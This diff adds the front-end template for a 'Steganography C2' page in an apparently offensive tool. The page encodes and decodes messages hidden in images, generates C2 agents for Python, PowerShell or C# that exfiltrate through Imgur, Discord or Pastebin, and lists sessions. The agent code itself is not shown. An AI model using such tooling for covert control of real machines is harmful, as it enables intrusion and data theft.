@@ -1,0 +1,589 @@
+{% extends "base.html" %}
+
+{% block title %}Steganography C2 - CyberPulse Pro{% endblock %}
+
+{% block head %}
+<style>
+    .image-drop-zone {
+        border: 2px dashed rgba(0, 255, 136, 0.3);
+        border-radius: 12px;
+        padding: 40px;
+        text-align: center;
+        transition: all 0.3s ease;
+        cursor: pointer;
+        min-height: 200px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+    .image-drop-zone:hover, .image-drop-zone.dragover {
+        border-color: #00ff88;
+        background: rgba(0, 255, 136, 0.1);
+    }
+    .image-preview {
+        max-width: 100%;
+        max-height: 250px;
+        border-radius: 8px;
+        margin-top: 10px;
+    }
+    .method-card {
+        background: rgba(0, 255, 136, 0.05);
+        border: 1px solid rgba(0, 255, 136, 0.2);
+        border-radius: 8px;
+        padding: 15px;
+        margin-bottom: 10px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+    .method-card:hover, .method-card.selected {
+        border-color: #00ff88;
+        background: rgba(0, 255, 136, 0.15);
+    }
+    .platform-badge {
+        display: inline-flex;
+        align-items: center;
+        padding: 8px 15px;
+        border-radius: 20px;
+        margin: 5px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+    }
+    .platform-badge:hover, .platform-badge.selected {
+        border-color: #00ff88;
+        box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+    }
+    .capacity-bar {
+        height: 8px;
+        border-radius: 4px;
+        background: #333;
+        overflow: hidden;
+        margin-top: 5px;
+    }
+    .capacity-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #00ff88, #00cc6a);
+        transition: width 0.5s ease;
+    }
+    .code-output {
+        background: #0d0d0d;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Courier New', monospace;
+        font-size: 12px;
+        max-height: 400px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+    }
+    .session-card {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        border: 1px solid rgba(0, 255, 136, 0.3);
+        border-radius: 8px;
+        padding: 15px;
+        margin-bottom: 10px;
+    }
+    .stego-tabs {
+        display: flex;
+        margin-bottom: 20px;
+    }
+    .stego-tab {
+        flex: 1;
+        padding: 15px;
+        text-align: center;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #333;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+    .stego-tab:first-child { border-radius: 8px 0 0 8px; }
+    .stego-tab:last-child { border-radius: 0 8px 8px 0; }
+    .stego-tab.active {
+        background: rgba(0, 255, 136, 0.2);
+        border-color: #00ff88;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-4">
+    <!-- Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h1 class="text-gradient mb-2">
+                        <i class="fas fa-image me-3"></i>Steganography C2
+                    </h1>
+                    <p class="text-muted mb-0">Covert command & control via image steganography • Hide in plain sight 🖼️</p>
+                </div>
+                <span class="badge bg-success px-3 py-2">
+                    <i class="fas fa-eye-slash me-2"></i>COVERT
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="stego-tabs">
+        <div class="stego-tab active" onclick="switchTab('encode')">
+            <i class="fas fa-lock me-2"></i>Encode
+        </div>
+        <div class="stego-tab" onclick="switchTab('decode')">
+            <i class="fas fa-unlock me-2"></i>Decode
+        </div>
+        <div class="stego-tab" onclick="switchTab('agent')">
+            <i class="fas fa-robot me-2"></i>Generate Agent
+        </div>
+        <div class="stego-tab" onclick="switchTab('sessions')">
+            <i class="fas fa-satellite-dish me-2"></i>Sessions
+        </div>
+    </div>
+
+    <!-- Encode Tab -->
+    <div id="encodeTab" class="tab-content">
+        <div class="row">
+            <div class="col-lg-6">
+                <!-- Image Upload -->
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-header bg-success bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-upload me-2"></i>Cover Image</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="image-drop-zone" id="encodeDropZone" onclick="document.getElementById('encodeFileInput').click()">
+                            <i class="fas fa-cloud-upload-alt fa-3x text-muted mb-3"></i>
+                            <p class="text-muted mb-0">Drop image here or click to upload</p>
+                            <small class="text-muted">PNG, JPEG, BMP supported</small>
+                            <img id="encodePreview" class="image-preview" style="display: none;">
+                        </div>
+                        <input type="file" id="encodeFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(this, 'encode')">
+                        
+                        <div class="mt-3" id="encodeCapacity" style="display: none;">
+                            <div class="d-flex justify-content-between">
+                                <span>Capacity:</span>
+                                <span id="capacityText">0 bytes</span>
+                            </div>
+                            <div class="capacity-bar">
+                                <div class="capacity-fill" id="capacityFill" style="width: 0%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Message Input -->
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-header bg-secondary bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-comment-dots me-2"></i>Secret Message</h5>
+                    </div>
+                    <div class="card-body">
+                        <textarea class="form-control bg-dark text-white" id="secretMessage" rows="4" 
+                                  placeholder="Enter command or data to hide..."></textarea>
+                        <small class="text-muted">Characters: <span id="charCount">0</span></small>
+                    </div>
+                </div>
+
+                <!-- Encryption -->
+                <div class="card bg-dark border-secondary">
+                    <div class="card-header bg-secondary bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-key me-2"></i>Encryption (Optional)</h5>
+                    </div>
+                    <div class="card-body">
+                        <input type="password" class="form-control bg-dark text-white" id="encryptionKey" 
+                               placeholder="Encryption key (XOR)">
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6">
+                <!-- Method Selection -->
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-header bg-secondary bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-cog me-2"></i>Steganography Method</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="method-card selected" onclick="selectMethod(this, 'lsb_simple')">
+                            <div class="d-flex justify-content-between">
+                                <strong>LSB Simple</strong>
+                                <span class="badge bg-success">Fast</span>
+                            </div>
+                            <small class="text-muted">Basic Least Significant Bit encoding</small>
+                        </div>
+                        <div class="method-card" onclick="selectMethod(this, 'lsb_random')">
+                            <div class="d-flex justify-content-between">
+                                <strong>LSB Random</strong>
+                                <span class="badge bg-warning">Secure</span>
+                            </div>
+                            <small class="text-muted">Random pixel selection for better stealth</small>
+                        </div>
+                        <div class="method-card" onclick="selectMethod(this, 'lsb_encrypted')">
+                            <div class="d-flex justify-content-between">
+                                <strong>LSB Encrypted</strong>
+                                <span class="badge bg-danger">Most Secure</span>
+                            </div>
+                            <small class="text-muted">Encrypted LSB with XOR cipher</small>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Actions -->
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-body">
+                        <button class="btn btn-success w-100 mb-2" onclick="encodeMessage()">
+                            <i class="fas fa-lock me-2"></i>Encode Message
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Result -->
+                <div class="card bg-dark border-secondary" id="encodeResult" style="display: none;">
+                    <div class="card-header bg-success bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-check-circle me-2"></i>Encoded Image</h5>
+                    </div>
+                    <div class="card-body text-center">
+                        <img id="encodedImage" class="image-preview">
+                        <div class="mt-3">
+                            <button class="btn btn-outline-success" onclick="downloadEncodedImage()">
+                                <i class="fas fa-download me-2"></i>Download
+                            </button>
+                            <button class="btn btn-outline-info" onclick="exfiltrateImage()">
+                                <i class="fas fa-share me-2"></i>Exfiltrate
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Decode Tab -->
+    <div id="decodeTab" class="tab-content" style="display: none;">
+        <div class="row">
+            <div class="col-lg-6">
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-header bg-warning bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-upload me-2"></i>Stego Image</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="image-drop-zone" id="decodeDropZone" onclick="document.getElementById('decodeFileInput').click()">
+                            <i class="fas fa-cloud-upload-alt fa-3x text-muted mb-3"></i>
+                            <p class="text-muted mb-0">Drop encoded image here</p>
+                            <img id="decodePreview" class="image-preview" style="display: none;">
+                        </div>
+                        <input type="file" id="decodeFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(this, 'decode')">
+                    </div>
+                </div>
+
+                <div class="card bg-dark border-secondary">
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <label class="form-label">Decryption Key (if encrypted)</label>
+                            <input type="password" class="form-control bg-dark text-white" id="decryptionKey">
+                        </div>
+                        <button class="btn btn-warning w-100" onclick="decodeMessage()">
+                            <i class="fas fa-unlock me-2"></i>Decode Message
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6">
+                <div class="card bg-dark border-secondary">
+                    <div class="card-header bg-secondary bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-file-alt me-2"></i>Decoded Message</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="code-output" id="decodedOutput">
+# Waiting for encoded image...
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Agent Tab -->
+    <div id="agentTab" class="tab-content" style="display: none;">
+        <div class="row">
+            <div class="col-lg-5">
+                <div class="card bg-dark border-secondary mb-4">
+                    <div class="card-header bg-info bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-robot me-2"></i>Agent Configuration</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <label class="form-label">C2 URL</label>
+                            <input type="url" class="form-control bg-dark text-white" id="c2Url" 
+                                   placeholder="https://your-c2-server.com">
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Exfiltration Platform</label>
+                            <div id="platformContainer">
+                                <span class="platform-badge selected" onclick="selectPlatform(this, 'imgur')">
+                                    <i class="fas fa-image me-2"></i>Imgur
+                                </span>
+                                <span class="platform-badge" onclick="selectPlatform(this, 'discord')">
+                                    <i class="fab fa-discord me-2"></i>Discord
+                                </span>
+                                <span class="platform-badge" onclick="selectPlatform(this, 'pastebin')">
+                                    <i class="fas fa-paste me-2"></i>Pastebin
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="mb-3">
+                            <label class="form-label">Encryption Key</label>
+                            <input type="text" class="form-control bg-dark text-white" id="agentKey" 
+                                   placeholder="Shared secret key">
+                        </div>
+
+                        <div class="mb-3">
+                            <label class="form-label">Language</label>
+                            <select class="form-select bg-dark text-white" id="agentLanguage">
+                                <option value="python">Python</option>
+                                <option value="powershell">PowerShell</option>
+                                <option value="csharp">C#</option>
+                            </select>
+                        </div>
+
+                        <button class="btn btn-info w-100" onclick="generateAgent()">
+                            <i class="fas fa-code me-2"></i>Generate Agent
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-7">
+                <div class="card bg-dark border-secondary">
+                    <div class="card-header bg-secondary bg-opacity-25 d-flex justify-content-between">
+                        <h5 class="mb-0"><i class="fas fa-code me-2"></i>Agent Code</h5>
+                        <button class="btn btn-sm btn-outline-secondary" onclick="copyAgentCode()">
+                            <i class="fas fa-copy me-1"></i>Copy
+                        </button>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="code-output" id="agentCode" style="min-height: 400px;">
+# Stego C2 Agent Generator
+# Configure settings and click Generate
+
+# Features:
+# - Covert image-based C2 communication
+# - LSB steganography encoding
+# - Encrypted payload transmission
+# - Multiple exfiltration platforms
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sessions Tab -->
+    <div id="sessionsTab" class="tab-content" style="display: none;">
+        <div class="row">
+            <div class="col-12">
+                <div class="card bg-dark border-secondary">
+                    <div class="card-header bg-secondary bg-opacity-25">
+                        <h5 class="mb-0"><i class="fas fa-satellite-dish me-2"></i>Active Sessions</h5>
+                    </div>
+                    <div class="card-body" id="sessionsContainer">
+                        <p class="text-muted text-center">No active sessions</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let selectedMethod = 'lsb_simple';
+let selectedPlatformExfil = 'imgur';
+let encodeImageData = null;
+let decodeImageData = null;
+let encodedImageData = null;
+
+document.getElementById('secretMessage').addEventListener('input', function() {
+    document.getElementById('charCount').textContent = this.value.length;
+});
+
+function switchTab(tab) {
+    document.querySelectorAll('.stego-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+    
+    event.target.closest('.stego-tab').classList.add('active');
+    document.getElementById(tab + 'Tab').style.display = 'block';
+}
+
+function selectMethod(element, method) {
+    document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedMethod = method;
+}
+
+function selectPlatform(element, platform) {
+    document.querySelectorAll('.platform-badge').forEach(b => b.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedPlatformExfil = platform;
+}
+
+function handleImageUpload(input, type) {
+    const file = input.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        const preview = document.getElementById(type + 'Preview');
+        preview.src = e.target.result;
+        preview.style.display = 'block';
+        
+        if (type === 'encode') {
+            encodeImageData = e.target.result;
+            checkCapacity();
+        } else {
+            decodeImageData = e.target.result;
+        }
+    };
+    reader.readAsDataURL(file);
+}
+
+function checkCapacity() {
+    if (!encodeImageData) return;
+
+    fetch('/stego/api/capacity', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({image: encodeImageData})
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('encodeCapacity').style.display = 'block';
+        document.getElementById('capacityText').textContent = data.capacity_bytes + ' bytes';
+    });
+}
+
+function encodeMessage() {
+    const message = document.getElementById('secretMessage').value;
+    const key = document.getElementById('encryptionKey').value;
+
+    if (!encodeImageData || !message) {
+        alert('Please upload an image and enter a message');
+        return;
+    }
+
+    fetch('/stego/api/encode', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            image: encodeImageData,
+            message: message,
+            method: selectedMethod,
+            key: key || null
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            encodedImageData = data.encoded_image;
+            document.getElementById('encodedImage').src = data.encoded_image;
+            document.getElementById('encodeResult').style.display = 'block';
+        } else {
+            alert('Encoding failed: ' + data.error);
+        }
+    });
+}
+
+function decodeMessage() {
+    const key = document.getElementById('decryptionKey').value;
+
+    if (!decodeImageData) {
+        alert('Please upload an encoded image');
+        return;
+    }
+
+    fetch('/stego/api/decode', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            image: decodeImageData,
+            method: selectedMethod,
+            key: key || null
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            document.getElementById('decodedOutput').textContent = data.message;
+        } else {
+            document.getElementById('decodedOutput').textContent = 'Decoding failed: ' + data.error;
+        }
+    });
+}
+
+function generateAgent() {
+    const c2Url = document.getElementById('c2Url').value;
+    const key = document.getElementById('agentKey').value;
+    const language = document.getElementById('agentLanguage').value;
+
+    if (!c2Url) {
+        alert('Please enter C2 URL');
+        return;
+    }
+
+    fetch('/stego/api/generate-agent', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            c2_url: c2Url,
+            platform: selectedPlatformExfil,
+            key: key,
+            language: language
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('agentCode').textContent = data.agent_code;
+    });
+}
+
+function downloadEncodedImage() {
+    if (!encodedImageData) return;
+    const link = document.createElement('a');
+    link.href = encodedImageData;
+    link.download = 'stego_image.png';
+    link.click();
+}
+
+function exfiltrateImage() {
+    alert('Exfiltration feature - configure platform credentials');
+}
+
+function copyAgentCode() {
+    const code = document.getElementById('agentCode').textContent;
+    navigator.clipboard.writeText(code);
+    alert('Copied to clipboard');
+}
+
+// Drag and drop handlers
+['encodeDropZone', 'decodeDropZone'].forEach(id => {
+    const zone = document.getElementById(id);
+    zone.addEventListener('dragover', e => {
+        e.preventDefault();
+        zone.classList.add('dragover');
+    });
+    zone.addEventListener('dragleave', () => zone.classList.remove('dragover'));
+    zone.addEventListener('drop', e => {
+        e.preventDefault();
+        zone.classList.remove('dragover');
+        const file = e.dataTransfer.files[0];
+        if (file && file.type.startsWith('image/')) {
+            const input = document.getElementById(id.replace('DropZone', 'FileInput'));
+            const dt = new DataTransfer();
+            dt.items.add(file);
+            input.files = dt.files;
+            handleImageUpload(input, id.replace('DropZone', ''));
+        }
+    });
+});
+</script>
+{% endblock %}
